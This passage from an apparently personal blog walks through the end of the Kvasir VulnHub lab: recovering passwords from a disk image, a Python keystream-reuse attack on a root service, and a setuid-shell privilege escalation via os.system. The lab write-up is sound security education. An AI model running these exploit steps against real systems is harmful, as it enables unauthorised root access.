<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>diskimage: x86 boot sector, code offset 0x3c, OEM-ID <span class="s2">&quot;MSDOS5.0&quot;</span>, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors <span class="m">122031</span> <span class="o">(</span>volumes &gt; <span class="m">32</span> MB<span class="o">)</span> , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT <span class="o">(</span><span class="m">16</span> bit<span class="o">)</span>
</span><span class='line'>root@tritonal:/# mount -t vfat -o loop,ro,noexec diskimage /mnt
</span><span class='line'>root@tritonal:/# <span class="nb">cd</span> /mnt
</span><span class='line'>root@tritonal:/mnt# ls
</span><span class='line'>Secret.rar
</span><span class='line'>bas@tritonal:~<span class="nv">$ </span>dd <span class="k">if</span><span class="o">=</span>diskimage <span class="nv">of</span><span class="o">=</span>test.wav <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">263168</span> <span class="nv">count</span><span class="o">=</span>405152
</span><span class='line'>405152+0 records in
</span><span class='line'>405152+0 records out
</span><span class='line'><span class="m">405152</span> bytes <span class="o">(</span><span class="m">405</span> kB<span class="o">)</span> copied, 1.18141 s, <span class="m">343</span> kB/s
</span><span class='line'>bas@tritonal:~<span class="nv">$ </span>file test.wav
</span><span class='line'>test.wav: RIFF <span class="o">(</span>little-endian<span class="o">)</span> data, WAVE audio, Microsoft PCM, <span class="m">16</span> bit, stereo <span class="m">22050</span> Hz
</span></code></pre></td></tr></table></div></figure>


<p>It sounded horrible&hellip; yet familiar! I loaded it up in Sonic Visualizer and saw what it sounded like:</p>

<p><img src="http://barrebas.github.io/assets/kvasir/07.png" alt="" /></p>

<p>Cool. Looks like it shows another one of those passwords. It&rsquo;s not for <code>kefka</code>, but for <code>Secret.rar</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:/tmp<span class="nv">$ </span>unrar e -pOrcWQi5VhfCo /mnt/Secret.rar
</span><span class='line'>
</span><span class='line'>UNRAR 5.00 beta <span class="m">8</span> freeware      Copyright <span class="o">(</span>c<span class="o">)</span> 1993-2013 Alexander Roshal
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Extracting from /mnt/Secret.rar
</span><span class='line'>
</span><span class='line'>Extracting  MyPassword.txt                                            OK
</span><span class='line'>All OK
</span><span class='line'>bas@tritonal:/tmp<span class="nv">$ </span>cat MyPassword.txt
</span><span class='line'>5224XbG5ki2C
</span></code></pre></td></tr></table></div></figure>


<p>Now the last one <em>is</em> for kefka!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>terra@dev2:~<span class="nv">$ </span>ssh kefka@192.168.4.100
</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.4.100 (192.168.4.100)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is 28:a1:7b:9c:cb:bc:aa:23:02:e1:e8:29:a0:c0:31:b8.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.4.100<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">kefka@192.168.4.100&#39;</span>s password:
</span><span class='line'>Linux adm 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sat Sep <span class="m">27</span> 20:40:07 2014
</span><span class='line'>kefka@adm:~<span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> kefka on this host:
</span><span class='line'>    env_reset, mail_badpass,
</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User kefka may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /opt/wep2.py
</span></code></pre></td></tr></table></div></figure>


<p>This box is the final hurdle. <code>kefka</code> may run <code>/opt/wep2.py</code> as root. That script is not readable nor writeable. Looks like we need to exploit it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kefka@adm:~<span class="nv">$ </span>sudo /opt/wep2.py <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 1560
</span><span class='line'>kefka@adm:~<span class="nv">$ </span>netstat -ant
</span><span class='line'>Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State
</span><span class='line'>tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN
</span><span class='line'>tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:1234          0.0.0.0:*               LISTEN
</span><span class='line'>tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.4.100:22        192.168.4.50:34929      ESTABLISHED
</span><span class='line'>tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</span><span class='line'>kefka@adm:~<span class="nv">$ </span>nc localhost <span class="nv">1234</span>
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>Can you retrieve my secret..?
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>
</span><span class='line'>Usage:
</span><span class='line'><span class="s1">&#39;V&#39;</span> to view the encrypted flag
</span><span class='line'><span class="s1">&#39;E&#39;</span> to encrypt a plaintext string <span class="o">(</span>e.g. <span class="s1">&#39;E AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>
</span><span class='line'>V
</span><span class='line'>89355e:d7172c4f5a691729b8a8cdd4
</span><span class='line'>E AAAA
</span><span class='line'>924ea9:65efc08e
</span><span class='line'>E AAAA
</span><span class='line'>0d2782:98181206
</span><span class='line'>V
</span><span class='line'>305c0c:4255c9f1e049ee1d75b36545
</span></code></pre></td></tr></table></div></figure>


<p>Combined with the name of this script, it looks like I need to do an attack similar to cracking WEP! I made the following script to do it quickly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="s">&quot;127.0.0.1&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="mi">1234</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">keepgoing</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="c"># banner</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">lookup</span> <span class="o">=</span> <span class="p">{}</span>  <span class="c"># we are going to build a lookup table for the IV and encrypted secret. </span>
</span><span class='line'>
</span><span class='line'><span class="c"># this challenge lets us view the encrypted secret and lets us encrypt a message ourselves.</span>
</span><span class='line'><span class="c"># in doing so, it shows &quot;IV:encrypted message&quot;. we&#39;ll do a stream cipher re-use style attack.</span>
</span><span class='line'><span class="c"># we&#39;ll build a lookup table with encrypted secret &amp; the corresponding IV</span>
</span><span class='line'><span class="c"># and if we encounter the same IV for our message, then we can xor the encrypted flag, </span>
</span><span class='line'><span class="c"># encrypted message and plaintext message to get the flag (or actually, the secret salt)</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">keepgoing</span><span class="p">:</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;V</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>    <span class="c"># request the encrypted secret</span>
</span><span class='line'>  <span class="n">encryptedKey</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>    <span class="c"># grab it</span>
</span><span class='line'>  <span class="n">parts</span> <span class="o">=</span> <span class="n">encryptedKey</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">)</span>   <span class="c"># split &amp; store</span>
</span><span class='line'>  <span class="n">lookup</span><span class="p">[</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;E &quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\xFF</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>  <span class="c"># ask to encrypt this message (12 x &quot;0xFF&quot;, easy to reverse)</span>
</span><span class='line'>  <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>    <span class="c"># grab response</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">parts</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">)</span>       <span class="c"># split it</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="n">lookup</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>   <span class="c"># check if the IV is already seen before</span>
</span><span class='line'>      <span class="n">k1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>      <span class="c"># JACKPOT! convert string to hex</span>
</span><span class='line'>      <span class="n">k2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lookup</span><span class="p">[</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]],</span> <span class="mi">16</span><span class="p">)</span>   <span class="c"># convert string to hex</span>
</span><span class='line'>      <span class="n">d1</span> <span class="o">=</span> <span class="n">k1</span> <span class="o">^</span> <span class="n">k2</span> <span class="c"># xor the encrypted secret &amp; encrypted message</span>
</span><span class='line'>      <span class="n">d2</span> <span class="o">=</span> <span class="n">d1</span> <span class="o">^</span> <span class="mh">0xffffffffffffffffffffffff</span>    <span class="c"># xor with plaintext &quot;message&quot;</span>
</span><span class='line'>      <span class="n">key</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">d2</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c"># output of hex() is &quot;0x...L&quot;, but .decode() doesn&#39;t want those chars</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">key</span>                 <span class="c"># debug output...</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">key</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">)</span>  <span class="c"># output decrypted secret!!</span>
</span><span class='line'>      <span class="n">keepgoing</span> <span class="o">=</span> <span class="mi">0</span> <span class="c"># stop the loop. we&#39;re done!</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> <span class="c"># close socket. be nice.</span>
</span></code></pre></td></tr></table></div></figure>


<p>This literally cracks it in seconds:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kefka@adm:~<span class="nv">$ </span>sudo /opt/wep2.py <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 1565
</span><span class='line'>kefka@adm:~<span class="nv">$ </span><span class="nb">time </span>python solve.py
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>Can you retrieve my secret..?
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>
</span><span class='line'>Usage:
</span><span class='line'><span class="s1">&#39;V&#39;</span> to view the encrypted flag
</span><span class='line'><span class="s1">&#39;E&#39;</span> to encrypt a plaintext string <span class="o">(</span>e.g. <span class="s1">&#39;E AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>305736553676774734573156
</span><span class='line'>0W6U6vwG4W1V
</span><span class='line'>
</span><span class='line'>real  0m3.003s
</span><span class='line'>user  0m0.780s
</span><span class='line'>sys   0m0.776s
</span></code></pre></td></tr></table></div></figure>


<p>So we&rsquo;re given another password, <code>0W6U6vwG4W1V</code>. It&rsquo;s not the root password, there are no encrypted flags on the box&hellip; what should I do with this? This had me stumped for a while. Out of pure desperation, I entered it into the <code>/opt/wep2.py</code> service:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kefka@adm:~<span class="nv">$ </span>sudo /opt/wep2.py <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 1583
</span><span class='line'>kefka@adm:~<span class="nv">$ </span>nc localhost <span class="nv">1234</span>
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>Can you retrieve my secret..?
</span><span class='line'><span class="o">=============================</span>
</span><span class='line'>
</span><span class='line'>Usage:
</span><span class='line'><span class="s1">&#39;V&#39;</span> to view the encrypted flag
</span><span class='line'><span class="s1">&#39;E&#39;</span> to encrypt a plaintext string <span class="o">(</span>e.g. <span class="s1">&#39;E AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>
</span><span class='line'>0W6U6vwG4W1V
</span><span class='line'>&gt; id
</span><span class='line'>&gt; whoami
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
</span><span class='line'>NameError: name <span class="s1">&#39;whoami&#39;</span> is not defined
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Wut? Could this be a python shell?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt; import os<span class="p">;</span> os.system<span class="o">(</span><span class="s2">&quot;/bin/cp /bin/sh /tmp/shell; chmod 4777 /tmp/shell&quot;</span><span class="o">)</span>
</span><span class='line'>&gt; ^C
</span><span class='line'>kefka@adm:~<span class="nv">$ </span>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;/opt/wep2.py&quot;</span>, line 94, in &lt;module&gt;
</span><span class='line'>    handler<span class="o">(</span>sock, addr<span class="o">)</span>
</span><span class='line'>  File <span class="s2">&quot;/opt/wep2.py&quot;</span>, line 74, in handler
</span><span class='line'>    sock.send<span class="o">(</span>p1<span class="o">)</span>
</span><span class='line'>socket.error: <span class="o">[</span>Errno 32<span class="o">]</span> Broken pipe
</span><span class='line'>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span>+  Exit <span class="m">1</span>                  sudo /opt/wep2.py
</span><span class='line'>kefka@adm:~<span class="nv">$ </span>ls /tmp
</span><span class='line'>capture.log  shell
</span><span class='line'>kefka@adm:~<span class="nv">$ </span>/tmp/shell
</span><span class='line'><span class="c"># id </span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>kefka<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>kefka<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>kefka<span class="o">)</span>
</span><span class='line'><span class="c"># whoami</span>
</span><span class='line'>root
</span></code></pre></td></tr></table></div></figure>


<p>Heck yes! Final troll by Rasta Mouse:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ls -al /root</span>
</span><span class='line'>total 32
</span><span class='line'>drwx------  <span class="m">3</span> root root <span class="m">4096</span> Sep <span class="m">28</span> 21:11 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Aug  <span class="m">9</span> 15:38 ..
</span><span class='line'>drwx------  <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">13</span> 18:17 .aptitude
</span><span class='line'>-rw-------  <span class="m">1</span> root root   <span class="m">87</span> Sep <span class="m">28</span> 11:55 .bash_history
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
</span><span class='line'>-r--------  <span class="m">1</span> root root  <span class="m">690</span> Sep <span class="m">28</span> 21:09 flag
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Nov <span class="m">19</span>  <span class="m">2007</span> .profile
</span><span class='line'>-rw-------  <span class="m">1</span> root root <span class="m">1641</span> Sep <span class="m">28</span> 11:47 .viminfo
</span><span class='line'><span class="c"># cat /root/flag</span>
</span><span class='line'>    _  __                             _
</span><span class='line'>   <span class="p">|</span> <span class="p">|</span>/ /   __ __   __ _     ___     <span class="o">(</span>_<span class="o">)</span>      _ _
</span><span class='line'>   <span class="p">|</span> <span class="s1">&#39; &lt;    \ I /  / _` |   (_-&lt;     | |     | &#39;</span>_<span class="p">|</span>
</span><span class='line'>   <span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  _<span class="se">\_</span>/_  <span class="se">\_</span>_,_<span class="p">|</span>   /__/_   _<span class="p">|</span>_<span class="p">|</span>_   _<span class="p">|</span>_<span class="p">|</span>_
</span><span class='line'>  _<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>
</span><span class='line'>  <span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span><span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span>
</span><span class='line'>
</span><span class='line'>Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
</span><span class='line'>gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax
</span><span class='line'>gur Zrnq bs Cbrgel...
</span><span class='line'>
</span><span class='line'>Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
</span><span class='line'>Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.
</span><span class='line'>
</span><span class='line'>Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
</span><span class='line'>uggc://jv-sh.pb.hx, <span class="c">#IhyaUho VEP be Gjvggre.</span>
</span><span class='line'>
</span><span class='line'>  enfgn_zbhfr<span class="o">(</span>@_EnfgnZbhfr<span class="o">)</span>
</span><span class='line'><span class="c"># cat /root/flag | tr &#39;n-za-mN-ZA-M&#39; &#39;a-zA-Z&#39;</span>
</span><span class='line'>    _  __                             _
</span><span class='line'>   <span class="p">|</span> <span class="p">|</span>/ /   __ __   __ _     ___     <span class="o">(</span>_<span class="o">)</span>      _ _
</span><span class='line'>   <span class="p">|</span> <span class="s1">&#39; &lt;    \ V /  / _` |   (_-&lt;     | |     | &#39;</span>_<span class="p">|</span>
</span><span class='line'>   <span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  _<span class="se">\_</span>/_  <span class="se">\_</span>_,_<span class="p">|</span>   /__/_   _<span class="p">|</span>_<span class="p">|</span>_   _<span class="p">|</span>_<span class="p">|</span>_
</span><span class='line'>  _<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>
</span><span class='line'>  <span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span><span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span>
</span><span class='line'>
</span><span class='line'>Congratulations on beating Kvasir - I hope you enjoyed
</span><span class='line'>the ride.  Take his blood, mix with honey and drink
</span><span class='line'>the Mead of Poetry...
</span><span class='line'>
</span><span class='line'>Big shout out to my beta testers: @barrebas and @TheColonial.
</span><span class='line'>Special thanks to Bas <span class="k">for</span> his patience during this endeavour.
</span><span class='line'>
</span><span class='line'>Feel free to ping me with thoughts/comments on
</span><span class='line'>http://wi-fu.co.uk, <span class="c">#VulnHub IRC or Twitter.</span>
</span><span class='line'>
</span><span class='line'>  rasta_mouse<span class="o">(</span>@_RastaMouse<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yes! Done! I enjoyed this VM very much. Many many thanks to <a href="https://twitter.com/_RastaMouse">Rasta Mouse</a> for this awesome VM and of course <a href="http://vulnhub.com">g0tmi1k</a> for hostin it!</p>
]]></content>
  </entry>
  
</feed>
